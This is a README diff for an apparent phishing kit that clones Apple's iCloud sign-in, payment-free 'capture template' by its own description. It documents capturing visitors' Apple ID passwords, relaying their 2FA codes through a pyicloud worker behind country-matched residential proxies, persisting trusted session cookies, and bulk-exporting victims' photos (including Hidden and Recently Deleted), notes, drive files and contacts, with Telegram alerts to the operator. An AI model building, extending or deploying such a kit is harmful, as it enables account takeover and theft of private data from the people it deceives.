@@ -5,8 +5,12 @@ A React 19 + Tailwind rebuild of the five screens that make up the sign-in flow 
 
 - **web process** (`server/index.js`) serves the built React app and resolves the
   visitor's IP + country through rotating proxies;
-- **Socket.IO process** (`server/socket/index.js`, separate port) carries public
-  events and a password-protected admin namespace;
+- **Socket.IO process** (`server/socket/index.js`, separate port) owns the
+  store and carries public auth/2FA/export events, a password-protected admin
+  namespace, and the worker job bus;
+- **Python worker** (`python/worker/`) logs in with pyicloud, handles 2FA,
+  trusts and stores the session, inventories the account, and exports
+  resumably with a SQLite manifest;
 - **Telegram bot** (grammY) runs beside the socket server and shares its store;
 - **Python client** template for the same Socket.IO server.
 
@@ -31,58 +35,92 @@ to the email step. The card keeps its height across the swap, so the page does
 not jump; the password is captured with the email and sent when the code step
 completes.
 
-The flow is wired end to end:
+The auth flow is socket-driven:
 
 ```
-/sign-in ──email─Continue──▶ password ──Sign In──▶ /loading ──3.5 s──▶ /verify
-        ──6 digits──▶ /terms ──Agree──▶ /done
+/sign-in ──auth:start──▶ /loading ──auth:2fa──▶ /verify ──auth:result ok──▶ /terms
+       └─ invalid/error ─▶ /sign-in (email preserved, Apple-style error)
+                                                       └─ export:start ─▶ /done
 ```
 
 ## Run
 
 ```bash
 npm install
-npm run dev                   # front end only, http://127.0.0.1:5173
+cp .env.example .env            # ADMIN_PASSWORD + WORKER_TOKEN at minimum
+npm run dev                     # front end only, :5173
 ```
 
-Full stack:
+Full stack (web + socket + Python worker):
 
 ```bash
-cp .env.example .env           # set ADMIN_PASSWORD at minimum
+python3 -m venv python/.venv
+python/.venv/bin/pip install -r python/requirements.txt
+
 npm run build
-npm run backend                # web :3000 + socket :4001
+npm run all                     # web :3000, socket :4001, worker (pyicloud)
 # open http://127.0.0.1:3000/sign-in and http://127.0.0.1:3000/admin
 ```
 
-Or separately:
+Individually:
 
 ```bash
-npm run serve                  # web only   :3000
-npm run socket                 # socket only :4001 (+ Telegram if enabled)
+npm run serve                   # web only   :3000
+npm run socket                  # socket only :4001 (+ Telegram if enabled)
+npm run worker                  # Python worker (or worker:venv)
+npm run mock-worker             # fake worker for UI tests, no Apple account
 ```
 
-`npm run start` builds and then runs both.
+If the venv is not on PATH, use:
+
+```bash
+PYTHONPATH=python python/.venv/bin/python -m worker
+```
+
+`npm run start` builds and then starts web + socket (not the worker).
 
 > The dev front end talks to `http://<host>:4001` by default. Set
 > `VITE_SOCKET_URL` if the socket server lives elsewhere, or put both behind one
 > reverse proxy and forward `/socket.io` to `:4001`.
+>
+> Set `VITE_MOCK_AUTH=1` (or run the flow test) to exercise the screens without
+> a worker; `npm run mock-worker` gives the same thing at the socket level.
 
 ## Architecture
 
 ```
-browser ──HTTP──▶ web (:3000) ──▶ /api/geo ──▶ proxy pool ──▶ geo providers
+browser ──HTTP──▶ web :3000 ──▶ /api/geo ──▶ proxy pool ──▶ geo providers
    │                 └── dist/ (React SPA, /admin)
    │
-   └──WebSocket──▶ socket (:4001)
-                     ├── /public   anonymous: hello, submit, ping
-                     ├── /admin    password in handshake: list/get/update/delete/notice
-                     ├── store     in-memory + server/data/items.json
-                     └── Telegram  grammY long polling
+   └─Socket.IO──▶ socket :4001
+                    ├─ /public   browser auth, 2FA, export events
+                    ├─ /admin    password-protected operator console
+                    ├─ /worker   Python workers (shared token)
+                    ├─ Store      single writer, atomic JSON
+                    └─ grammY     Telegram bot + coalesced edits
+                          ▲
+                          │ Socket.IO outbound
+                    Python worker pool
+                    ├─ auth jobs (10 concurrent)
+                    ├─ export jobs (4 concurrent)
+                    ├─ sessions/<sha256(email)[:16]>/  (pyicloud cookies)
+                    └─ export/<email>/ + manifest.sqlite3
 ```
 
-The web process never reads the store; the socket process owns it. They share
-only the JSON file, which you can replace with Redis/Postgres by rewriting
-`server/store.js` (five methods, four events).
+Rules that the code enforces:
+
+- **One writer per store.** Only the socket process mutates accounts/jobs.
+  The web process serves static files and geo only.
+- **Node never calls Python synchronously.** Jobs are dispatched by id; workers
+  emit state/progress/results. The Node event loop never awaits a login or a
+  download.
+- **Python owns blocking work.** `pyicloud` is synchronous; each job runs in a
+  thread from a bounded pool while one asyncio loop owns the socket.
+- **One writer per session directory.** A per-email lock; a duplicate
+  submission joins the existing job.
+- **Bounded queues and throttled progress.** Python emits at most 1 progress
+  event/second/area; Telegram coalesces edits to one message per account every
+  2.5s.
 
 ### Web: IP + country
 
@@ -110,55 +148,113 @@ Three protections keep the free providers from rate-limiting you:
    list; each lookup starts at the next proxy, tries every provider, and falls
    back to a direct call only if `GEO_ALLOW_DIRECT=true`.
 
-All free providers are key-less (ip-api.com, ipwho.is, ipapi.co). Add or remove
-one in `server/geo/providers.js`; the normalised shape is the only contract.
-
 Client address extraction handles `cf-connecting-ip`, `true-client-ip`,
 `x-real-ip` and `x-forwarded-for` (`server/ip.js`), so it works behind nginx,
 Cloudflare, or a PaaS proxy.
 
-### Socket.IO security
+### Socket contracts
 
-The server is not an open event bus. Each namespace registers a **whitelist**;
-anything else is an unknown event and is ignored.
+Every namespace has a whitelist; unknown events are ignored. Payloads are
+validated with Zod and rate-limited per socket.
 
 | Namespace | Auth | Client may emit | Server emits |
 | --- | --- | --- | --- |
-| `/public` | none | `public:hello`, `public:submit`, `public:ping` | `public:state`, `public:count`, `public:notice` |
-| `/admin` | password in handshake | `admin:list`, `admin:get`, `admin:update`, `admin:delete`, `admin:stats`, `admin:notice`, `admin:ping` | `admin:ready`, `admin:change` |
+| `/public` | none | `public:hello`, `public:submit`, `public:ping`, `auth:start`, `auth:attach`, `auth:submit_2fa`, `auth:resend_2fa`, `auth:switch_2fa`, `export:start` | `public:*`, `auth:state`, `auth:2fa`, `auth:result`, `account:info`, `export:progress`, `export:done` |
+| `/admin` | password in handshake | `admin:list/get/update/delete`, `admin:accounts`, `admin:account`, `admin:refresh`, `admin:ping`, `admin:export`, `admin:stats`, `admin:notice` | `admin:ready`, `admin:change`, `admin:account`, `admin:job` |
+| `/worker` | `WORKER_TOKEN` in handshake | `worker:ready`, `worker:ack`, `job:state`, `job:2fa`, `job:result`, `job:account_info`, `job:export_progress`, `job:export_done`, `job:error`, `job:ping_result` | `worker:welcome`, `job:start`, `job:export`, `job:ping`, `job:2fa`, `job:cancel` |
 
-- The admin password is compared with `crypto.timingSafeEqual` before the socket
-  connects (`server/socket/auth.js`). A wrong password produces a
-  `connect_error: unauthorized` and no events are possible.
-- Every admin handler also re-checks `socket.data.role === "admin"`, so moving a
-  handler to the public namespace by mistake still fails closed.
-- Payloads are validated with Zod; per-socket rate limits stop spam
-  (`server/socket/rate-limit.js`).
-- Public submissions are acknowledged with an id only; the full record never
-  goes back to an anonymous client.
-- The role and limits live on the server. The React page is not trusted.
+- Admin password: `crypto.timingSafeEqual` before connect, plus a role check in
+  every handler; worker token: the same timing-safe comparison on `/worker`.
+- The browser only joins `job:<id>` and `account:<id>`. It never receives a
+  password (public account view), session path or cookie contents.
+- `auth:start` resolves the country server-side; the client cannot spoof it.
+  It returns `{ ok, jobId, accountId, reused, status }`.
+- A second tab for the same email attaches to the running job (`reused: true`).
+- `sessionStorage` keeps the job id; a refresh on `/loading` or `/verify`
+  re-attaches with `auth:attach`.
 
-Change `ADMIN_PASSWORD` in `.env`; the default is only for local development.
+### Auth flow
+
+1. Login calls `auth:start` with the email, password, browser UA, language and
+   timezone. Node resolves the visitor's country, creates the account/job and
+   queues it for a worker.
+2. The browser goes to `/loading` and waits. After 15s it says “taking a little
+   longer” but never auto-errors.
+3. A worker with a free auth slot preflights `sessions/<hash>/` with
+   `get_auth_status()`; a valid trusted session is reused and goes straight to
+   `/terms`.
+4. Otherwise pyicloud logs in with the visitor's UA/language through the
+   country-matched residential proxy. `PyiCloudFailedLoginException` → invalid;
+   network/5xx → one retry; terms accepted automatically.
+5. HSA2: options include the trusted-device push, each trusted phone (masked to
+   the last four digits) and security keys. `sms:<n>` switches delivery through
+   Apple's `verify/phone` path. A code is accepted up to three times; then
+   `trust_session()` persists the cookie jar.
+6. Legacy 2SA devices and security keys have their own branches; a missing
+   pyicloud capability is shown as a clear fallback, not a raw traceback.
+7. After trust, the worker runs the read-only inventory (profile, plan, storage,
+   counts) and emits `account:info`.
+8. On `/terms` agree, the browser emits `export:start`; `/done` follows
+   immediately while the worker exports in the background.
+
+Sessions are backed up before a re-auth attempt and restored if it fails. The
+worker never calls `logout()` and never deletes cookies.
+
+### Python worker
+
+`python/worker/` is an asyncio Socket.IO client plus bounded thread pools:
+
+| File | Responsibility |
+| --- | --- |
+| `__main__.py` | connection, slots, job manager, command acks, shutdown |
+| `auth.py` | preflight, SRP login, 2FA/2SA, trust, session backup |
+| `twofa.py` | masked phone options, delivery switching, code validation |
+| `inventory.py` | account/plan/storage, photos, notes, drive, contacts, reminders, calendars |
+| `exporter.py` | resumable export + SQLite manifest, skip-existing/force, progress |
+| `proxy.py` | anyip/niceproxy URL construction, masked URLs, exit IP probe |
+| `proxy_support.py` | gateway CONNECT retries, 407 pre-auth, 502/IP pinning (copied from the reference) |
+| `events.py` | thread → asyncio bridge and 1/s progress throttle |
+
+Proxy format: anyip gets `user,country_<CC>,session_<stable>`; niceproxy gets
+`user-ssid-<stable>-country-<CC>`. The session id is a SHA-256 of the email, so
+the exit IP stays stable for the trust token. `ANYIP_PROXY_URL` is separate
+from `GEO_PROXIES`; no proxy credentials are logged.
+
+Export layout:
+
+```
+export/<email>/
+  Photos/{Hidden,Recently Deleted,Library,<album>}/...
+  Notes/{txt,html,assets}/...
+  Drive/...
+  Contacts/contacts.json
+  Calendar/calendars.json
+  Reminders/reminders.json
+  Account/account.json
+  manifest.sqlite3
+```
+
+A file is skipped only when the manifest row is `done`, the path exists and the
+size matches. `mode:"force"` re-downloads. Downloads use temp file + rename,
+three retries, SHA-256, and per-item failure isolation. Photos stream
+`versions["original"]["url"]`; Hidden/Recently Deleted are enumerated before
+Library and deduped by `asset.id`.
 
 ### Telegram bot
 
-grammY is the async-first Telegram framework used here (the maintained
-successor to Telegraf, with typed contexts and a much smaller surface). It is
-disabled unless `TELEGRAM_ENABLED=true` and `TELEGRAM_BOT_TOKEN` are set.
+grammY is the async-first Telegram framework used here (maintained successor to
+Telegraf, typed contexts, small surface). Disabled unless
+`TELEGRAM_ENABLED=true` and `TELEGRAM_BOT_TOKEN` are set.
 
-The template demonstrates everything needed for a store-like control bot:
-
-- inline keyboards + callback queries;
-- paginated list (`‹ Prev` / `Next ›`) over the shared store;
-- editing the current message in place (`editMessageText`), so navigation feels
-  like an app rather than a chat;
-- item detail, status buttons, delete with confirmation;
-- optional user allow-list (`TELEGRAM_ALLOWED_USERS`);
-- new-submission notification to `TELEGRAM_CHAT_ID`.
-
-Commands: `/start`, `/list`, `/stats`. The bot reads and writes the same store
-as Socket.IO, so an admin action in Telegram updates every open admin dashboard
-immediately.
+- `/menu` (and `/start`) — accounts 5 per page with status lights, `‹ Prev`,
+  `Next ›`, refresh, stats, legacy submissions.
+- Account view — status, identity, plan, storage, proxy exit, session trust,
+  counts, export progress; `Ping`, `Export missing`, `Redownload missing`
+  (`force`), `Counts`, back/menu.
+- New visitor → one message; results and 2FA switches edit that same message.
+  Edits are coalesced at 2.5s and catch “message is not modified” / 429
+  `retry_after`.
+- `/stats`, `/accounts`, `/list` for the legacy submissions view.
 
 ### Python client
 
@@ -188,7 +284,16 @@ ones:
 | `GEO_ALLOW_DIRECT` | `true` | direct provider fallback |
 | `TELEGRAM_ENABLED` | `false` | start the bot |
 | `TELEGRAM_BOT_TOKEN` | empty | BotFather token |
-| `STORE_FILE` | `server/data/items.json` | persistence file |
+| `STORE_FILE` | `server/data/items.json` | submissions + accounts + jobs |
+| `WORKER_TOKEN` | `change-me` | `/worker` handshake token |
+| `WORKER_URL` | `http://127.0.0.1:4001` | worker socket target |
+| `ANYIP_PROXY_URL` | empty | residential login proxy |
+| `MAX_AUTH_JOBS` | `10` | concurrent logins |
+| `MAX_EXPORT_JOBS` | `4` | concurrent exports |
+| `EXPORT_DIR` | `./export` | export root |
+| `SESSIONS_DIR` | `./sessions` | cookie/session root |
+| `KEEPALIVE_HOURS` | `6` | status ping interval |
+| `VITE_MOCK_AUTH` | unset | run the UI without a worker |
 
 ## Compare against the reference
 
@@ -214,8 +319,35 @@ Other checks:
 npm run compare:chrome       # header/local nav/footer/document boxes at 10 widths
 npm run compare:width        # pixel diff at 600 / 768 / 834
 npm run compare:responsive  # no horizontal scroll at 15 widths × 5 routes
-npm run compare:flow         # email → loading → code → terms → success
+npm run compare:flow         # email → password → loading → code → terms → success
 ```
+
+Socket and worker tests (start `npm run socket` first):
+
+```bash
+npm run test:socket          # legacy public/admin events
+npm run test:auth            # auth, 2FA, export, duplicate join, 10 parallel
+npm run test:store           # atomic persistence + stale job recovery
+npm run test:views           # Telegram cards, lights, callback sizes
+npm run test:py              # 14 Python unit tests (proxy, mask, manifest, auth)
+npm run mock-worker          # fake Node worker for the browser/admin demo
+```
+
+To run the real Python worker without an Apple account:
+
+```bash
+WORKER_FAKE=1 PYTHONPATH=python python/.venv/bin/python -m worker
+```
+
+It accepts any password and `123456` as the code, and returns a fake profile,
+counts and a small export. The production path uses the same job protocol with
+pyicloud.
+
+`compare/flow_test.py` sets `sessionStorage.mockAuth=1`, so the visual flow
+does not need a worker. The real browser flow is covered by `test:auth` at the
+socket layer and by the mock worker in a manual run. `test:auth` uses the
+newest connected worker; stop other workers first if you want a guaranteed
+isolated run.
 
 The comparison scripts need Python 3 with Playwright and Pillow. `compare/py.sh`
 uses `~/.cache/scampage-forge/venv` when it exists and otherwise falls back to
@@ -294,7 +426,7 @@ tailwind.config.js         fonts + keyframes (ring drift, nib fade, veil, spin)
 public/fonts/              SF Pro Text/Display, SF Pro Icons, shared-icons
 public/assets/             rings.webp, privacy.svg, privacy-muted.svg, favicon
 src/
-  App.jsx                  routes, flow timer, public socket page events
+  App.jsx                  routes, auth-state routing, slow loading notice
   router.js                tiny history router (no dependency)
   index.css                @font-face + base type
   components/
@@ -306,34 +438,47 @@ src/
     Spinner.jsx            Apple's eight-nib spinner + loading veil
     navSvgs.js             the wordmarks, captured from the reference
   pages/
-    Login.jsx              email + password states in one card
-    Verify.jsx  Terms.jsx  Done.jsx
+    Login.jsx              email + password, auth:start, inline error
+    Verify.jsx             OTP + 2FA picker / resend / switch
+    Terms.jsx  Done.jsx
   admin/
-    Admin.jsx              password form, stats, table, detail, broadcast
-    useAdminSocket.js      /admin connection + ack helpers
-  lib/socket.js            shared /public socket (hello, submit)
+    Admin.jsx              accounts + submissions, detail, ping/export
+    useAdminSocket.js      /admin connection, accounts, ack helpers
+  lib/socket.js            public socket + auth state store
+  lib/useAuth.js           useSyncExternalStore hook
   data/termsHtml.js        the legal text, inline styles converted to classes
 server/
   config.js                env -> one config object
   app.js                   Express app: dist/, /api/geo, SPA fallback
   index.js                 web process entry
   ip.js                    forwarded-header client IP + country helpers
-  store.js                 Map + JSON persistence, events
+  store.js                 items + accounts + jobs, atomic debounced JSON
   geo/
     index.js               cache -> header -> proxy rotation -> providers
     providers.js           ip-api / ipwho.is / ipapi.co normalisers
     proxy.js               ProxyAgent pool, round robin
     cache.js               TTL cache
   socket/
-    index.js               separate-port server, owns the store, starts the bot
-    public.js              anonymous whitelist
-    admin.js               admin whitelist, password middleware, live updates
-    auth.js                timing-safe password check
+    index.js               separate-port server, store owner, keepalive, bot
+    public.js              browser auth/2FA/export whitelist
+    admin.js               admin whitelist, accounts, live updates
+    worker.js              /worker token auth and event intake
+    worker-pool.js         queues, slots, command acks, room relays
+    auth.js                timing-safe admin check
     rate-limit.js          per-socket event buckets
   telegram/
-    bot.js                 grammY wiring, pagination, edit-in-place, notify
-    views.js               message + keyboard builders
+    bot.js                 grammY console, coalesced edits, 429 handling
+    views.js               account cards, menus, pagination, counts
 python/
+  worker/
+    __main__.py            socket client, slots, job manager, commands
+    auth.py                preflight, login, 2FA/2SA, trust, backups
+    twofa.py               masked phones, delivery switching, code checks
+    inventory.py           profile/plan/storage + service counts
+    exporter.py            resumable export, manifest, progress
+    proxy.py               sticky country proxy construction
+    events.py              thread -> asyncio bridge + throttling
+  tests/test_worker.py     14 unit tests
   client.py                async public/admin client template
   requirements.txt
 compare/
@@ -350,9 +495,14 @@ compare/
 
 ## Template notes
 
-- The store is deliberately tiny: `Map` + synchronous JSON writes. Swap
-  `server/store.js` for a database and keep the events; neither
-  Socket.IO nor the bot needs to change.
+- The store is deliberately small: `Map`s + atomic, debounced JSON writes
+  (temp file + rename). Swap `server/store.js` for a database and keep the
+  events; Socket.IO, the worker pool and the bot need no changes.
+- The Python worker and Socket.IO share one process boundary but not a thread:
+  jobs are dispatched by id and reported back as events. Scaling out means
+  running more workers against the same `/worker` token.
+- `export/<email>/manifest.sqlite3` is the resume source of truth; deleting it
+  makes the next export re-verify every file.
 - The Telegram bot and Socket.IO share one process because they share the store.
   To split them, expose the store over HTTP or move both to Redis.
 - `server/data/items.json` is git-ignored and contains two demo rows on first
@@ -360,6 +510,8 @@ compare/
 - `ADMIN_PASSWORD` is plaintext in the environment because this is a template.
   For production, hash it (argon2/bcrypt) and compare the hash in
   `server/socket/auth.js`; the rest of the flow stays the same.
-- Submitted passwords are stored in plaintext in `server/data/items.json` (this
-  is a capture template, not a password manager). Encrypt them at rest if the
-  store outlives a demo.
+- Submitted passwords and pyicloud cookie jars are stored in plaintext under
+  `server/data/` and `sessions/` (this is a capture template, not a password
+  manager). Encrypt them at rest if the store outlives a demo.
+- `worker` requires the Python venv on PATH; use
+  `PYTHONPATH=python python/.venv/bin/python -m worker` otherwise.
